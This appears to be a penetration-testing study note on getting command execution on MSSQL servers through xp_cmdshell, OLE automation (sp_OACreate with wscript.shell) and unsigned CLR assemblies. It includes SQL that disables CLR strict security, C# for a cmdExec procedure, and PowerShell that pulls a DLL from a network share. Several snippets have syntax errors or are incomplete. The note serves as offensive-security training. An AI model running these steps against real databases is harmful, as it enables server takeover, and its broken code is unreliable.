# Code Execution
Techniques to achieve code execution on MSSQL servers

## 1. XP_CMDSHELL Stored Procedure
The most common and most detectable method.
- Impersonate sa login
- use sp_configure to enable xp_cmdshell in advanced options.
- execute commands

The example will execute the `whoami` command
[xp-cmdshell.cs](./Code/code-execution-xp-cmdshell.cs)

## 2. sp_OACreate Stored Procedure 
Create a new stored procedure and call it with `sp_oamethod`

[sp_oacreate](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql?view=sql-server-ver17) takes 2 arguments:
    1. OLE object we want to instantiate `wscript.shell`
    2. Local variable for storage `@myshell`

`@myshell` declaration must come first so it can be accessed when `sp_oacreate` is invoked.
```sql
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
```

### sp_OAMethod
Set the OLE configuration and call the stored procedure.
[sp-oacreate.cs](./code-execution-sp-oacreate.cs)

[sp_OAMethod](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oamethod-transact-sql?view=sql-server-ver17) takes 4 arguments:
    1. name of procedure to execute (myshell)
    2. method (OLE) object (run)
    3. option output var and any parameters for the invoked method
    4. send command as parameter

Queries to set OLE and call the procedure. The result will be "test" written to a file.
```cs
EXEC sp-configure 'Ole Automation Procedures',1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';
```

## Custom Assemblies
Create a custom dll that is marked as a stored procedure and imported using [CREATE ASSEMBLY](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql?view=sql-server-ver17)

## 1. Create Stored Procedure (DLL)
The assembly to load into the MSSQL server. Compile [stored-procedures.cs](./stored-procedures.cs) as a dll. 

Create a stored procedure named `cmdExec`
```cs
[Microsoft.SqlServer.Server.SqlProcedure]
public static void cmdExec (SqlString execCommand) {
    proc.StartInfo.UseShellExecute = false; // Force cmd.exe
    proc.StartInfo.RedirectStandardOutput = true; // Redirect to pipe to avoid writting to console
}
```

Pipes are used for reading output
```cs
SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqldbType.NVarChar,4000)); // Create Record
SqlContext.Pipe.SendResultsStart(record); // Start Pipe
record.SetString(0,proc.StandardOutput.ReadToEnd().ToString()); // Save Stdout
SqlContext.Pipe.SendResultsRow(record); // Send
SqlContext.Pipe.SendResultsEnd(); // End Pipe
```

## 2. Configure SQL server settings
We can only create a procedure from a assembly if the `TRUSTWORTHY` property is set 
- only msdb database has this enabled by default.
- CLR integration prevents create stored procedure from assembly by default.
- 2017 has `CLR strict security` which only allows signed assemblies.
- Use `sp_configure` to edit the configuration

SQL Server:
```sql
use msdb

EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'clr enabled',1
RECONFIGURE

EXEC sp_configure 'clr strict security',0
RECONFIGURE
```

## 3. Create Assembly 
Import the assembly with the [CREATE ASSEMBLY](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-assembly-transact-sql?view=sql-server-ver17) statement.
- custom name `myAssembly`
- file location `0xAA` byte code
- permission set `UNSAFE` allows unsigned .net code

```sql
CREATE ASSEMBLY myAssembly FROM 0xAAAAAA WITH PERMISSION_SET = UNSAFE;
```

This powershell can generate the byte code required.
```pwsh
$result = new-object -type system.text.stringBuilder
while (($byte = $[IO.File]::OpenRead("\\10.10.10.10\name.dll").ReadByte()) -gt -1) {
    $result.Append($byte.ToString("X2")) | out-null
}
$result.ToString -join "" | out-file result.txt
```

### 4. Create Procedure
Create a CLR (Common Language Runtime) stored procedure. 
[CREATE PROCEDURE](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-procedure-transact-sql?view=sql-server-ver17) will take the external ASSEMBLY named `myAssembly` and run the `cmdExec` method in our stored procedure (dll). 

Create a procedure named `cmdExec` that will call the stored procedure `cmdExec`
```sql
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

EXEC cmdExec 'whoami'
```

### 6. Clean up & Testing
You cannot have multiple assemblies and procedures in the database. The following script will clean up any old data.
[cleanup script](./Code/code-execution-cleanup.cs)
